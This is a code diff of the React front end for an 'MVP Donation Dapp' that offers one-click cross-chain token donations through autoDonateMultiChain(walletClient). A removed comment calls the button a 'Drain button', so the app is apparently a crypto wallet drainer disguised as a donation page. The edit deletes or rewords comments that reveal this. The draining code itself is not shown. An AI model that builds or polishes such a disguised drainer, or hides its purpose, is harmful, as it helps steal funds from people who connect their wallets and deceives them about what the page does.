@@ -29,7 +29,6 @@ export default function App() {
   }
 
   async function handleDonate() {
-    // ensure we have a connected walletClient from wagmi
     if (!walletClient) {
       addNotification("No connected wallet client found. Please connect your wallet.", "error");
       setLast({ success: false, reason: "No wallet client available." });
@@ -41,7 +40,6 @@ export default function App() {
       setStatus("running");
       addNotification("Donation started… 🚀", "info");
 
-      // IMPORTANT: autoDonateMultiChain must accept walletClient (unchanged logic)
       const res = await autoDonateMultiChain(walletClient);
       setLast(res);
 
@@ -62,22 +60,21 @@ export default function App() {
 
   return (
     <div className="text-white min-h-screen">
-      {/* Background */}
+      {/* Background layer */}
       <Background />
 
-      {/* Navbar (fixed) */}
+      {/* Navbar */}
       <Navbar />
 
-      {/* Content area: reserve space for fixed navbar */}
+      {/* Price ticker */}
       <div className="pt-[84px]">
-        {/* Price ticker (full width bar) */}
         <div className="w-full">
           <PriceTicker />
         </div>
 
-        {/* Center the main container on large screens */}
-        <div className="w-full flex justify-center">
-          <div className="w-full max-w-screen-lg px-4">
+        {/* Main content wrapper */}
+        <div className="flex justify-center w-full px-4">
+          <div className="w-full max-w-screen-lg">
             <main className="flex flex-col items-center gap-6 py-8">
               <h1 className="text-3xl sm:text-4xl md:text-5xl font-extrabold text-center leading-tight">
                 MVP Donation Dapp
@@ -87,14 +84,13 @@ export default function App() {
                 Donate your tokens across chains in one click — safe, fast, and transparent.
               </p>
 
-              {/* How it Works + CTA row */}
+              {/* How it Works + Donate */}
               <div className="w-full flex flex-col sm:flex-row items-center justify-center gap-4">
                 <div className="flex-shrink-0">
                   <GuideModal />
                 </div>
 
                 <div className="flex-shrink-0">
-                  {/* Drain button hidden until wallet is connected */}
                   {isConnected ? (
                     <button
                       onClick={handleDonate}
@@ -111,7 +107,7 @@ export default function App() {
                 </div>
               </div>
 
-              {/* (Optional) Dev status panel — kept for now; remove/comment if you don't want it */}
+              {/* Status panel */}
               <div className="w-full bg-black/50 p-4 rounded-lg overflow-x-auto">
                 <div className="flex items-start justify-between">
                   <div>
@@ -131,7 +127,7 @@ export default function App() {
         </div>
       </div>
 
-      {/* Notifications (floating toasts) */}
+      {/* Notifications */}
       <Notifications notifications={notifications} />
     </div>
   );
